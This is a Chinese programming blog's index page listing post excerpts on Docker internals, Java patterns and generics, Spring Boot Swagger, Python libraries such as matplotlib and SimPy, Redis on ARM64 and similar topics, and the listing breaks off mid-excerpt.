<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b5495feac989ea7a1925fcc07b7f83d/" rel="bookmark">
			linux内核分析及应用 -- Linux 的进程隔离技术与 Docker 容器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近两年容器技术突然变得很火热，几乎所有开发人员都在学习这个技术。技术人员并不见得一定比女性购物更加理智，有时候，选择一种新技术也仅仅是为了追赶时髦和潮流。
从实现的角度来讲，容器技术不是全新的发明，Docker 容器只是针对 Linux 内核提供的基础功能（例如 namespace、cgroup）进行了扩展。
本章不打算介绍所有与虚拟化相关的技术和实现方案，而是探讨和容器相关的虚拟化技术。主要探讨以下几个内容：
1）虚拟化相关的技术原理。
2）容器技术经常会用到的 Linux 内核的相关功能，如 namespace、cgroup 等实现。
3）Docker 容器部分的实现分析。
7.1　虚拟化相关技术 在容器技术流行之前，为了提升单机的利用率，并且实现进程之间的隔离，比较流行的方式是通过虚拟化的相关技术在一台物理机上运行多个操作系统。下面简单介绍 CPU 虚拟化技术。
一般情况下，我们都是通过软件的方式来模拟多个硬件栈然后再在上面模拟硬件指令，跑多个操作系统。但是这种方法在可靠性、安全性和性能上存在很多问题，所以 Intel 在它的硬件产品上引入了 Intel VT（Virtualization Technology，虚拟化技术），如图7-1所示。Intel VT 可以让一个 CPU 工作起来像多个 CPU 在并行运行，从而使得在一部计算机内同时运行多个操作系统成为可能。
图7-1　CPU 虚拟化技术原理图
Intel CPU 提供了：CPU 虚拟化、内存虚拟化、I/O 虚拟化、图形卡虚拟化、网络虚拟化等功能，本章主要介绍软件相关的虚拟化技术，有兴趣大家可以通过访问：http://www.intel.com/content/www/us/en/virtualization/virtualization-technology/intel-virtualizationtechnology.html 来了解 Intel VT 相关的技术。
Linux 内核中，内置了 KVM 模块，主要负责虚拟机的创建、虚拟内存的分配、VCPU 寄存器的读写以及 VCPU 的运行，可以基于 Intel VT 和 AMD-V 这两种不同厂商的解决方案来实现。
用户如果需要使用 KVM 虚拟化环境，就需要使用 QEMU 之类的模拟器，用于模拟虚拟机的用户空间组件，提供 I/O 设备模型，访问外设的途径，如图7-2所示。
图7-2　KVM 解决方案原理
7.2　Linux 进程隔离技术 在简单了解了 Intel VT 的硬件虚拟化技术和 Linux 的 KVM 虚拟化解决方案之后，现在着重来了解一下容器隔离的相关技术。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b5495feac989ea7a1925fcc07b7f83d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61363606e45b60c9e5bdf906077d60b5/" rel="bookmark">
			监听者模式/观察者模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在这篇博文中，本人要讲解一种Java程序中很重要的一种设计模式——侦听者模式，通过这个模式，我们可以通过生成匿名内部类，来直接生成并且使用接口的对象。如果能够直接使用的话，我们在别的方法中要调用一个接口的方法时就非常容易了。那么，开始我们这篇博文的主题吧。
本人先来给出一个接口：
package com.mec.about_listener.core; public interface IMecListener { void somethingHappening(String message); } 可以看得到，在这个接口中，本人只给出了一个没有实现的方法。
那么，现在，本人来给出一个类，在这个类中，本人将一个方法的参数设为上面定义的接口的类型
package com.mec.about_listener.core; public class MecMainClass { private String someMessage; //注意：本人在这里给了一个类型为 接口类型 的成员 private IMecListener listener; public MecMainClass(String someMessage) { this.someMessage = someMessage; } private void doSomething() { if (listener == null) { return; } //这里调用了接口中的 方法 listener.somethingHappening(someMessage); } public void fun() { doSomething(); } public void addListener(IMecListener listener) { this.listener = listener; } } 现在，本人再来调用一下这个类，展现下 “侦听者模式” 的基本使用方法：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61363606e45b60c9e5bdf906077d60b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47c6601e562544e95439d1907cb0f785/" rel="bookmark">
			Java泛型的获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 讨论：https://ask.csdn.net/questions/921549
Java泛型是一种语法糖，最终统一都是 Object 类型，而不是编码时指定的类型。
结论是：编译器底层并不会存储泛型类型的，也不可能得到泛型的真实的 Class 类型。要获取自身的泛型定义，只能由子类获取。
最后那种方式要写成子类方式，在构造方法后面加上花括号，比如：
new A&lt;PostEntity,RoleEntity&gt;(){}.test() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf026b73bfa6e8b0455823b9bcd599b5/" rel="bookmark">
			ParameterizedType详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ParameterizedType详解
参数化类型
public interface ParameterizedType extends Type { Type[] getActualTypeArguments(); Type getRawType(); Type getOwnerType(); } 何为参数化类型
列举一个实体类用代码来解释什么是参数化类型
public class ParameterizedBean { List&lt;String&gt; list1; List list2; Map&lt;String,Long&gt; map1; Map map2; Map.Entry&lt;Long,Short&gt; map3; } 测试代码
Field[] fields = ParameterizedBean.class.getDeclaredFields(); for(Field f:fields){ //是否是ParameterizedType System.out.print(f.getName()+":"+(f.getGenericType() instanceof ParameterizedType)); } 打印结果
list1:true list2:false map1:true map2:false map3:true 从打印结果看来,具有&lt;&gt;符号的变量是参数化类型
Type[] getActualTypeArguments() 该方法返回一个Type数组
测试代码
Field[] fields = ParameterizedBean.class.getDeclaredFields(); for(Field f:fields){ if(f.getGenericType() instanceof ParameterizedType){ ParameterizedType pType =(ParameterizedType) f.getGenericType(); System.out.print("变量："+pType.getTypeName()+" "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf026b73bfa6e8b0455823b9bcd599b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4283a37b1502b7bdbc4872e426ad461/" rel="bookmark">
			JAVA的初级练习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.打印出深度5层杨辉三角形。
2.计算字符串中子串出现的次数 。
3.两个字符串连接程序。
4.输入数组，最大的与第一个元素交换，最小的与最后一个元素交换，输出数组。
解答：
1. 打印出深度5层杨辉三角形。
public class PascalTriangle { public static int[][] getPascalTriangle(int nmax) { // 三角数组分配 int[][] odds = new int[nmax + 1][]; for (int n = 0; n &lt;= nmax; n++) odds[n] = new int[n + 1]; // 填充三角形数组 for (int n = 0; n &lt; odds.length; n++) { for (int k = 0; k &lt; odds[n].length; k++) { /* * 计算二项式系数 n*(n-1)*(n-2)*...*(n-k+1)/(1*2*3*...*k) */ int lotteryOdds = 1; for (int i = 1; i &lt;= k; i++) { lotteryOdds = lotteryOdds * (n - i + 1) / i; } odds[n][k] = lotteryOdds; } } return odds; } public static void main(String[] args) { int nmax = 29; //打印三角形数组 for (int[] row : getPascalTriangle(nmax)) { for (int odd : row) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f4283a37b1502b7bdbc4872e426ad461/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97e36c0464152829e877fe1e5cff8f50/" rel="bookmark">
			Spring Boot 2.X(十五)：集成 Swagger2 开发 API 文档（在线&#43;离线）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 相信很多后端开发在项目中都会碰到要写 api 文档，不管是给前端、移动端等提供更好的对接，还是以后为了以后交接方便，都会要求写 api 文档。
而手写 api 文档的话有诸多痛点：
文档更新的时候，需要再次发送给对接人接口太对，手写文档很难管理接口返回的结果不明确不能直接在线测试接口，通常需要使用工具，如 postman 等 Swagger 就很好的解决了这个问题。
Swagger 简介 Swagger 是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。总体目标是使客户端和文件系统作为服务器以同样的速度来更新。文件的方法，参数和模型紧密集成到服务器端的代码，允许API来始终保持同步。
官网：https://swagger.io
Swagger 使用 1.相关依赖 &lt;!--swagger2 --&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; 2.Swagger 配置类 @Configuration @EnableSwagger2 public class SwaggerConfig { @Bean public Docket buildDocket() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(buildApiInf()) //将api的元信息设置为包含在json resourcelisting响应中 //.host("127.0.0.1:8080") //设置ip和端口，或者域名 .select() //启动用于api选择的生成器 //.apis(RequestHandlerSelectors.any()) .apis(RequestHandlerSelectors.basePackage("cn.zwqh.springboot.controller"))//指定controller路径 .paths(PathSelectors.any()).build(); } private ApiInfo buildApiInf() { Contact contact=new Contact("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97e36c0464152829e877fe1e5cff8f50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c49153dc58cdc04e2498dcdc020d099/" rel="bookmark">
			python库matplotlib之plt画子图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、绘图add_subplot方式subplot方式 二、设置无缝布局紧密布局 一、绘图 add_subplot方式 fig = plt.figure(figsize=(10,10))：表示初始化figure画布对象。
figsize表示图像大小，单位英寸inch，默认为defaults to rcParams[“figure.figsize”] = [6.4, 4.8].ax = fig.add_subplot(3,2,plt_index)：表示添加的子图处在画布的位置
3行2列，此图在第plt_index个位置。
第一幅图的下标从1开始。
行数*列数要大于等于要创建子图的数量ax.imshow()：图像的具体内容plt.show()：显示画布 例子：
# 我要创建四张图 import matplotlib.pyplot as plt # 设定整个画布的尺寸 fig = plt.figure(figsize=(10,10)) # 第一幅图的下标从1开始，设置6张子图 for plt_index in range(1,7): # 往画布上添加子图：按三行二列，添加到下标为plt_index的位置 ax = fig.add_subplot(3,2,plt_index) # 绘制对应的子图 ax.imshow(np.arange(0,100).reshape(10,10)) pass # 显示画布 plt.show() subplot方式 # 我要创建四张图 import matplotlib.pyplot as plt # 设定整个画布的尺寸 plt.figure(figsize=(10,10)) # 第一幅图的下标从1开始，设置6张子图 for plt_index in range(1,7): # 往画布上添加子图：按三行二列，添加到下标为plt_index的位置 plt.subplot(3, 2, plt_index) # 绘图 plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c49153dc58cdc04e2498dcdc020d099/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/539557b775f63ba1b5ac037e61b76e7a/" rel="bookmark">
			什么是梯度？为什么梯度方向就是函数上升最快的方向
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/weixin_42398658/article/details/83017995
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5319ef4c858d865586d18d960ff663c/" rel="bookmark">
			中文预训练模型 ERNIE2.0 模型下载及安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019年7月，百度ERNIE再升级，发布持续学习的语义理解框架ERNIE 2.0，及基于此框架的ERNIE 2.0预训练模型, 它利用百度海量数据和飞桨（PaddlePaddle）多机多卡高效训练优势，通过深度神经网络与多任务学习等技术，持续学习海量数据和知识。基于该框架的艾尼（ERNIE）预训练模型，已累计学习10亿多知识，包括词法、句法、语义等多个维度的自然语言知识，有很强的通用语义表示能力，适用于各种NLP应用场景，效果提升明显，使用高效、便捷。
本篇内容教大家如何下载和使用！
一、预训练模型下载 ERNIE 2.0 英文 Base 模型
https://ernie.bj.bcebos.com/ERNIE_Base_en_stable-2.0.0.tar.gz
包含预训练模型参数、词典 vocab.txt、模型配置 ernie_config.json
ERNIE 2.0 英文 Large 模型
https://ernie.bj.bcebos.com/ERNIE_Large_en_stable-2.0.0.tar.gz
包含预训练模型参数、词典 vocab.txt、模型配置 ernie_config.json
二、数据下载 中文数据：https://ernie.bj.bcebos.com/task_data_zh.tgz
英文数据： 由于数据集协议问题，在这里无法直接提供英文数据集。GLUE 的数据下载方式请参考GLUE 主页(https://gluebenchmark.com/tasks)以及 GLUE 提供的数据下载代码(https://gist.github.com/W4ngatang/60c2bdb54d156a41194446737ce03e2e )。
假设所有数据集下载放置的路径为$GLUE_DATA，将数据下载完毕后，执行 sh ./script/en_glue/preprocess/cvt.sh $GLUE_DATA 将完成所有数据的格式转换，默认转换后的数据会输出到文件夹./glue_data_processed/。
三、PaddlePaddle安装 本项目依赖于 Paddle Fluid 1.5，请参考安装指南
（https://www.paddlepaddle.org.cn/#quick-start ）进行安装。
【重要】 安装后，需要及时的将 CUDA、cuDNN、NCCL2 等动态库路径加入到环境变量 LD_LIBRARY_PATH 之中，否则训练过程中会报相关的库错误。具体的paddlepaddle配置细节请查阅：
https://www.paddlepaddle.org.cn/documentation/docs/zh/1.5/beginners_guide/quick_start_cn.html
如果您想了解更多的 Paddle 的相关信息，例如针对实际问题建模、搭建自己网络等，这里有更多的来自官方的文档供您参考：
• 基本概念 ：介绍了 Fluid 的基本使用概念
• 准备数据 ：介绍使用 Fluid 训练网络时，数据的支持类型及传输方法
• 配置简单的网络： 介绍如何针对问题建模，并利用 Fluid 中相关算子搭建网络
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5319ef4c858d865586d18d960ff663c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7517379e44c58c514d8ee21dc5dcf7b/" rel="bookmark">
			JVM笔记：Java虚拟机的类加载器和双亲委派机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		类与类加载器 类加载器虽然只用于实现类的加载动作，但是它在Java程序中起到的作用却远远不限于类加载阶段。对于仍和一个类，都需要由加载它的类加载器和这个类本身一同确立其在Java虚拟机中的唯一性，每一个类加载器，都拥有一个独立的类名称空间。
换而言之，判断两个类是否相等，只有在这两个类是由同一个类加载器加载的前提下才有意义，否则，即使两个类来源于同一个Class文件，被同一个虚拟机加载，只要加载他们的类加载器不同，那这两个类必定不相同。
这里指的相等，包括代表类的Class对象的equal方法、isAssignableFrom方法、isInstance方法的返回结果，也包括使用instanceof关键字做对象所属关系判断等情况。如下面这个例子。
public class MyClassLoader extends ClassLoader { @Override public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException { try { String fileName = name.substring(name.lastIndexOf(".") + 1) + ".class"; InputStream inputStream = getClass().getResourceAsStream(fileName); if (inputStream == null) { return super.loadClass(name); } byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); return defineClass(name, bytes, 0, bytes.length); } catch (IOException e) { throw new ClassNotFoundException(name); } } } public class MyClass { public static void main(String[] args) throws Exception { Object object = new MyClassLoader().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7517379e44c58c514d8ee21dc5dcf7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e2caadd18e02b6033d79173a8392c47/" rel="bookmark">
			分享几个软件测试逻辑思维和综合面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		搜集整理了几个软件测试逻辑思维和综合面试题，供大家参考。
逻辑思维题 一个经理有3个女儿,3个女儿的年龄相加等于13,3个女儿的年龄相乘等于经理的年龄,一个下属知道经理的年龄,但不知道3个女儿的年龄,经理说只有一个女儿的头发是黑的.问3个女儿的年龄是多少?为什么?1000 个瓶子中有一瓶毒药，一只老鼠吃到毒药一周之内会死，如果要在一周之内检测出有毒药的一瓶，问至少需要几只老鼠？一棵蜡烛能点60分钟，在不借助任何工具的情况下怎么样使用两棵蜡烛测出45分钟?四双同样规格同样质量的袜子，两双白色，两双黑色．两个盲人都想取一双白色及一双黑色，但却没有别人帮助辨认颜色．该如何办？有三个任务：扫地、擦窗户、拖地，每个任务完成需要30分钟，有2个人，每个人同时只能干一件活，请问完成三个任务最快需要多长时间？一个商人骑一头驴要穿越1000公里长的沙漠，去卖3000根胡萝卜。已知驴一次性可驮1000根胡萝卜，但每走一公里又要吃掉一根胡萝卜。问：商人共可卖出多少胡萝卜？ 综合面试题 你的测试职业发展是什么？你自认为做测试的优势在哪里？为什么我们应该录取你？为什么选择测试这行？为什么值得公司雇用？如果雇用你，你能给部门带来什么贡献？如果明知这样做不对，你还会依主管的指过去做吗?如果你接到一个客户抱怨的电话，你确知无法解决他的问题，你会怎么处理?如果你的主管让你负责完成一项任务，要求时间为1天，但你评估需要1.5天，你该如何处理？你对测试最大的兴趣在哪里？为什么？您认为在测试人员同开发人员的沟通过程中，如何提高沟通的效率和改善沟通的效果？维持测试人员同开发团队中其他成员良好的人际关系的关键是什么？ 【点击此处查看 参考答案】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b24049a6bd30a60fb2555d3156a87c49/" rel="bookmark">
			Docker 部署Redis基于arm64架构 Jemalloc异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前使用docker部署redis服务
docker run --name some-redis -d redis:5.0.5 或者docker-compose部署，
version: '3' services: redis: container_name: redis image: "redis:5.0.5" ports: - "6379:6379" volumes: - /data/redis/redis.conf:/etc/redis/redis.conf - /data/redis/data:/data command: redis-server /etc/redis/redis.conf restart: always 都可以成功。但是最近换了架构为ARM64的CentOS服务器，在https://hub.docker.com/_/redis找到官方镜像，找到arm64架构对应镜像，进行启动，始终不能成功，一直报错：
经调查，是因为ARM64的CentOS服务器内存分页默认64Kb，其它主流服务器都是4Kb，redis启动时直接终止了进程，导致服务启动失败，且截至目前官方还没有提供解决方案（20191105）。
解决思路：
在redis.io中找到源码，并下载在arm64CentOS机器中重新编译成可执行文件在arm64CentOS机器中，以交互模式启动一个redis容器（docker run -it 由于redis启动不成功，因此先使用交互模式启动）再启动一个终端，将编译好的文件复制到容器中（docker cp ）最后把容器重新commit成一个新镜像（docker commit [containerID] newIMGName:tag） 镜像下载方式：
docker pull prettybige/redis-arm:5.0.5 镜像是public的，如果不能拉取，可以尝试先执行docker login，如果没有账户可以申请一个。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51775b9dc1317b7242d8b92895f65411/" rel="bookmark">
			SimPy(二)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Shared Resources共享资源 在进程交互中可能需要用到,一系列进程进行排队以使用某种资源,比如多个客户等待银行服务,多辆汽车等待通过缴费站,仓库货物的运输消耗和通信网络的数据包转发等.
Resources,可以由有限数量的过程一次使用的进程(例如,具有有限数量的燃油泵的加油站).
Containers,用于模拟同质,无差别主体的生产和消费的资源,可以是连续的(如水)或离散的(如苹果).
Stores,允许生成和使用的Python对象资源.
每个资源有最大容量和两个队列,一个是put something的队列另一个是get something的队列,put()和get()是相应的事件触发的方法.
import simpy def resource_user(env, resource): request = resource.request() # Generate a request event yield request # Wait for access yield env.timeout(1) # Do something resource.release(request) # Release the resource &gt;&gt;&gt; env = simpy.Environment() &gt;&gt;&gt; res = simpy.Resource(env, capacity=1)#创建资源 &gt;&gt;&gt; user = env.process(resource_user(env, res)) &gt;&gt;&gt; env.run() 因为每次都要release资源,若进程在等待中被中断,则要写成try:…finally:…结构,使用资源的request events能写成
def resource_user(env, resource): with resource.request() as req: # Generate a request event yield req # Wait for access yield env.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51775b9dc1317b7242d8b92895f65411/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dc6ddaf0b4f82eeb9019ddb37dafc05/" rel="bookmark">
			SimPy
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 简介安装命令EnvironmentEventsSleep until woken upWaiting for another process to terminateInterrupting another process 简介 SimPy是一个基于Python的异步事件调度器,产生一系列事件并按照仿真时间进行计划安排升序排列,在事件的循环序列中触发并执行,产生回调返回响应值,在物流,工厂制造业和餐饮服务业等工业仿真中都有所应用,比如优化快递分拣中的排班表,优化工厂制造的排班和成本,估算服务排队的时长等,还可以用于网络通信仿真.详细介绍可查阅官方文档和原理介绍,另有知乎简介.
安装命令 pip install simpy Environment Environment管理仿真时间的进行,让各种组件和事件按照一定的计划表进行驱动,管理仿真元素之间的关联, 主要 API 有
simpy.Environment.process #添加仿真进程 simpy.Environment.event #创建事件 simpy.Environment.timeout #提供延时(timeout)事件 simpy.Environment.until #仿真结束的条件（时间或事件） simpy.Environment.run #仿真启动 simpy.Environment.all_of simpy.Environment.any_of 创建一个空的仿真环境并实例化,然后执行一段时间,这时由于没有创建任何组件和事件,所以实际上什么也没有发生,也可以使用处理进程或事件作为结束条件
env=simpy.Environment()#创建环境并实例化 env.run(until=100)#运行仿真环境,100s后停止 Events simpy.events.Event是仿真事件,simpy是以事件作为基础组件进行构建的,各种其它类型如events.Process,events.Timeout都是以事件派生出来的,本质上还是Event.
events.Event | +— events.Timeout | +— events.Initialize | +— events.Process | +— events.Condition | | | +— events.AllOf | | | +— events.AnyOf 创建一个事件并定义响应函数,这个事件一旦调用之后就结束了,不会再响应了,在process event中也是如此.
import simpy def my_callback(event): print('Called back from', event) env = simpy.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3dc6ddaf0b4f82eeb9019ddb37dafc05/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0572340af694302ef7ccfcdeac5a4517/" rel="bookmark">
			Python中的时间元组与时间日期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、时间元组(time.struct_time)二、时间格式化三、time四、datetime五、timedelta六、calendar 一、时间元组(time.struct_time) python中时间元组是一个比较重要的类型，通过时间元组我们可以获取，年月日时分秒，星期几，一年中的第几天等信息。
索引属性属性含义属性取值0tm_year4位数年份0000-99991tm_mon月1-122tm_mday日1-313tm_hour小时0-234tm_min分钟0-595tm_sec秒0-61，60、61是闰秒6tm_wday星期几0-6，0是周一7tm_yday一年的第几天1到366，366闰年8tm_isdst夏令标识1-夏令时,0-非夏令时 -1-不确定，可能是因为手动创建 import time # &lt;class 'time.struct_time'&gt; localtime = time.localtime() # time.struct_time(tm_year=2019, tm_mon=11, tm_mday=3, tm_hour=9, tm_min=8, tm_sec=21, tm_wday=0, tm_yday=307, tm_isdst=0) print(type(localtime)) print(localtime) for attr in localtime: print(attr) 二、时间格式化 时间格式化是非常常用的一个功能，不管是从字符串到struct_time、date、datetime，还是从struct_time、date、datetime到字符串都需要用到。
格式化主要涉及到2个函数：
strftime：str表示字符串，f是format，time是时间，就是时间格式化为字符串
strptime：str表示字符串，p是parse，time是时间，就是字符串解析为时间
time和datetime都有这2个函数，后面会介绍，下面先看一下格式化的含义。
格式含义%y两位数的年份表示，00-99%Y四位数的年份表示，0000-9999%m月份，01-12%d日期，0-31%H24小时制小时数，0-23%I12小时制小时数，01-12%M分钟，00-59%S秒，00-59%a本地简化星期名称%A本地完整星期名称%b本地简化的月份名称%B本地完整的月份名称%c本地日期表示和时间表示%j第几天，001-366%p本地A.M\P.M%U第几周，00-53，星期天为星期的开始%W第几周，00-53，星期一为星期的开始%w星期几，0-6，星期天为星期的开始%x本地日期%X本地时间%Z当前时区的名称%%%符合，因为被当做转义字符 三、time time模块，主要处理和时间元组(struct_time)的格式化和解析。
当日也有本地化时间、获取时间戳，程序休眠等函数。
注意和datetime.time区分，datetime.time就是一般意义上的日期时间中的时间部分，主要就是时分秒。
import time # 格林威治天文时间元组 print(time.gmtime()) print(time.gmtime(1577851199)) # 本地时间元组 print(time.localtime()) print(time.localtime(1577851199)) # 格式化时间 # time.asctime([tupletime]) print(time.asctime()) # time.ctime([secs]) print(time.ctime()) # 格式化成2020-01-01 11:59:59形式 print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())) # 将格式字符串转换为时间戳 a = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0572340af694302ef7ccfcdeac5a4517/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2fbba00b2be2fd58d3e8a8715a4f980/" rel="bookmark">
			Layui 轮播插件 内容鼠标事件无法响应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Layui 轮播插件 内容自定义鼠标事件无法响应原因是 默认的控制标签&lt;div class="layui-carousel-ind"&gt;&lt;ul&gt;&lt;li class=""&gt;&lt;/li&gt;&lt;li class=""&gt;&lt;/li&gt;&lt;li class="layui-this"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;覆盖在轮播的内容上层，所以屏蔽轮播内容的鼠标事件响应
解决方法：
修改 &lt;div carousel-item="" class="carousel-items"&gt; 标签的层级属性，至于上层就可以响应鼠标事件了
/*
补充添加样式，提升标签层级 否则被layui 动态添加控制内容覆盖无法响应鼠标事件
*/
.carousel-items{
z-index:999;
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34264b9449970d1c4b9172c76685dc4f/" rel="bookmark">
			c&#43;&#43;与opencv实现mssim
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		c++配置opencv在这里：https://www.jianshu.com/p/5518046a5797
代码：
#include &lt;iostream&gt; #include &lt;opencv2\core\core.hpp&gt; #include &lt;opencv2\highgui\highgui.hpp&gt; #include &lt;opencv2\imgproc\imgproc.hpp&gt; #include &lt;cmath&gt; using namespace cv; Scalar getMSSIM(Mat inputimage1, Mat inputimage2) { //x:inputimage1 y:inputimage2 Mat i1 = inputimage1; Mat i2 = inputimage2; const double C1 = 6.5025, C2 = 58.5225; int d = CV_32F; Mat I1, I2; i1.convertTo(I1, d);//将CV_8U转成CV_32F i2.convertTo(I2, d); Mat I2_2 = I2.mul(I2);//y^2 Mat I1_2 = I1.mul(I1);//x^2 Mat I1_I2 = I1.mul(I2);//x*y Mat mu1, mu2; GaussianBlur(I1, mu1, Size(11, 11), 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34264b9449970d1c4b9172c76685dc4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c19c97d3aa8a98c1789c6394ed3479bf/" rel="bookmark">
			python 正则表达式 \d&#43;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		\d+ means one or more digit [0-9] (depending on LOCALE)
\d- means a digit followed by a dash -
\w+ means one or more word character [a-zA-Z0-9_] (depending on LOCALE)
\w- means a word char followed by a dash -
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/211506a83b89ef3f36a73b2dd8328797/" rel="bookmark">
			ABB机器人socket通讯和数据提取及转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ABB机器人创建socket，需要有616-1 PC-INTERFACE选项
同时需要新建socketdev类型的变量
套接字可分为客户端和服务端，这里一般把ABB作为客户端
PROC TCP_Socket()
